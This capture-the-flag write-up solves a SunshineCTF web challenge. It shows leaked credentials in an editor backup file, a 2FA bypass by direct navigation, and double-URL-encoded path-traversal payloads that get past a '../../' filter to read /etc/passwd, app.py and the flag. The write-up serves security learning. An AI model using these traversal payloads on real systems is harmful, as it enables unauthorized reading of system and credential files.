# Writeup

## Made By
`xelitte_`
## Points Earned: 463

## The Challenge Description

```
We recently started a new CMS, we've had issues with random bots scraping our pages but found a solution with robots! Anyways, besides that there are no new bug fixes. Enjoy our product!

Fuzzing is NOT allowed for this challenge, doing so will lead to IP rate limiting!

https://asteroid.sunshinectf.games
```

## Reconnaissance

- Firstly examined `robots.txt`, because the description mentions bots and I quickly made the connection to robots.txt, which revealed:
    
    ```
    Disallow: /.gitignore_test
    Disallow: /login
    Disallow: /admin/dashboard
    Disallow: /2FA
    ```
    
- Going to `/.gitignore_test`:
    
    ```
    # this tells the git CLI to ignore these files so they're not pushed to the repos by mistake.
    # this is because Muhammad noticed there were temporary files being stored on the disk when being edited
    # something about EMACs.
    # From MUHAMMAD: please make sure to name this .gitignore or it will not work !!!!
    # static files are stored in the /static directory.
    /index/static/login.html~
    /index/static/index.html~
    /index/static/error.html~
    ```
    
- Tested the listed paths; only `/index/static/login.html~` returned valuable info: copy of `login.html` with leaked credentials:
    
    ```html
    <input value="admin@lunarfiles.muhammadali" type="text" name="email">
    <input value="jEJ&(32)DMC<!*###" type="text" name="password">
    ```

## Authentication

- Used the leaked credentials to log in, redirecting to `/2FA` for two-factor authentication.
- Navigated directly to `/admin/dashboard`, bypassing 2FA successfully.

## Exploring the Application

- Explored the admin dashboard, focusing on the "Manage Files" section.
- With Burp I found a file download request: `GET /admin/download/secret3.txt`.
- Experimented with the `/admin/download/` endpoint to test for LFI vulnerabilities after i read the secret text files (there was mentioned them having a problem with LFI and hackers constantly downloading /etc/passwd with very important hint: using payloads from bookhacktricks. That made me go there and try every single payload):
    - `/admin/download//secret3.txt` redirected to `http://127.0.0.1:25307/admin/download/secret3.txt`, suggesting input processing after `/admin/download/`.
    - `/admin/download/./secret1.txt` successfully retrieved the file.
    - After trying some bypass payload i got this error which made me realize we have to use a payload that bypasses the special filter that detects the succession of ../../
    
    ```
    <p>You should be redirected automatically to the target URL: <a href="/admin/lunar_files?err_msg=%5B+Succession+of+&#39;../../&#39;+detected,+forbidden+%5D">/admin/lunar_files?err_msg=%5B+Succession+of+&#39;../../&#39;+detected,+forbidden+%5D</a>. If not, click the link.
    ```

## Finally found the working payload that bypasses filters

Raw version: 

```
https://asteroid.sunshinectf.games/admin/download/.././.././.././.././.././.././.././.././.././.././.././.././/etc/passwd
```

Then we use double url encoding to get this abomination of a payload:

```
https://asteroid.sunshinectf.games/admin/download/%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%2fetc%2fpasswd
```

## Locating the Flag

- Searched like a madman for `flag.txt` in common CTF locations without and everything failed.
- Took a step back to think about what the internal service uses and a teammate found the flag here: ('/proc/self/cwd/app.py')
- Successfully downloaded `app.py` with three directory traversals:

    ```
    https://asteroid.sunshinectf.games/admin/download/..%252f.%252f..%252f.%252f..%252fapp.py
    ```

- And that revealed the flag location:
  
    ```python
    with open("./FLAG/flag.txt", "r") as f:
        FLAG = f.read()
    ```
    
- Now that we knew the exact location of the flag it was easy to retrieve it: `./.././.././../FLAG/flag.txt` with double URL encoding:
    
    ```
    https://asteroid.sunshinectf.games/admin/download/%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%2fFLAG%2fflag.txt
    ```

## Solution

- Final payload to retrieve /etc/passwd:
    
    ```
    https://asteroid.sunshinectf.games/admin/download/%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%2fetc%2fpasswd
    ```
    
- Final payload to retrieve the flag:
    
    ```
    https://asteroid.sunshinectf.games/admin/download/%252e%252e%252f.%252f%252e%252e%252f.%252f%252e%252e%252f.%252f%2fFLAG%2fflag.txt
    ```
